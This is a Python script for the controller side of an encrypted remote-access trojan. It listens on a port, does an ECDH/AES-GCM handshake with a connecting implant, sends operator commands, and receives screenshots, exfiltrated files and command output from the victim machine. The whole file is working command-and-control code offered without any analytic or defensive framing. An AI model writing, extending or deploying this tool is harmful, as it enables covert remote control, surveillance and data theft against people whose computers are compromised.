#!/usr/bin/env python3

import socket, argparse, os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend
import datetime, subprocess

def aes_encrypt(data, key):
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, data, None)
    return nonce + ciphertext

def aes_decrypt(encrypted_data, key):
    aesgcm = AESGCM(key)
    nonce = encrypted_data[:12]
    ciphertext = encrypted_data[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)

def receive_full_data(socket, buffer_size=4096):
    data = b""
    while True:
        part = socket.recv(buffer_size)
        data += part
        if len(part) < buffer_size:
            break
    return data

def receive_with_size(socket):
    size_data = socket.recv(4)
    if not size_data:
        return b""
    size = int.from_bytes(size_data, byteorder='big')
    data = b""
    while len(data) < size:
        part = socket.recv(size - len(data))
        if not part:
            break
        data += part
    return data

def clear_screen():
    print("\033c", end="")

def start_server(ip, port):
    server_private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
    server_public_key = server_private_key.public_key()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print(f"[*] Listening on {ip}:{port}")
    client_socket, client_address = server.accept()

    try:
        client_socket.send(server_public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        ))

        client_public_key_bytes = client_socket.recv(4096)
        client_public_key = serialization.load_pem_public_key(
            client_public_key_bytes,
            backend=default_backend()
        )

        shared_key = server_private_key.exchange(ec.ECDH(), client_public_key)
        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=32,
            salt=None,
            info=b'handshake data',
            backend=default_backend()
        ).derive(shared_key)

        key = derived_key

    except (ConnectionResetError, ValueError, Exception) as e:
        print(f"\n[!] Handshake failed: {str(e)}")
        client_socket.close()
        return

    while True:
        try:
            command = input("\n[Server] Enter command: ").strip()
            
            if command == '\x0c':
                clear_screen()
                continue
            
            if command.lower() == "exit":
                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
                client_socket.send(encrypted_command)
                client_socket.close()
                break
            elif command == "screenshot":
                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
                client_socket.send(encrypted_command)
                screenshot_counter = 1
                while True:
                    encrypted_screenshot = receive_with_size(client_socket)
                    if not encrypted_screenshot:
                        break
                    screenshot_data = aes_decrypt(encrypted_screenshot, key)
                    timestamp = datetime.datetime.now().strftime("%d%m%Y_%H%M%S")
                    filename = f"screenshot_{timestamp}_{screenshot_counter}.png"
                    with open(filename, "wb") as screenshot_file:
                        screenshot_file.write(screenshot_data)
                    print(f"Screenshot saved as '{filename}'")
                    screenshot_counter += 1
            elif command.startswith("download"):
                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
                client_socket.send(encrypted_command)
                files_downloaded = 0
                while True:
                    encrypted_filename = receive_with_size(client_socket)
                    if not encrypted_filename:
                        break
                    filename = aes_decrypt(encrypted_filename, key).decode('utf-8')
                    print(f"[-] Downloading {filename}")
                    encrypted_content = receive_with_size(client_socket)
                    content = aes_decrypt(encrypted_content, key)
                    with open(filename, "wb") as f:
                        f.write(content)
                    files_downloaded += 1
                if files_downloaded > 0:
                    print("[+] File(s) downloaded")
            else:
                encrypted_command = aes_encrypt(command.encode('utf-8'), key)
                client_socket.send(encrypted_command)
                encrypted_response = receive_with_size(client_socket)
                if not encrypted_response:
                    break
                response = aes_decrypt(encrypted_response, key).decode('utf-8')
                print(f"\n[Client]: {response}")
        except KeyboardInterrupt:
            print("\n[!] Use 'exit' to close the connection, CTRL+C ignored.")
            continue
        except Exception as e:
            client_socket.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", required=True, help="IP address to bind to")
    parser.add_argument("-p", "--port", required=True, type=int, help="Port to bind to")
    args = parser.parse_args()
    start_server(args.ip, args.port)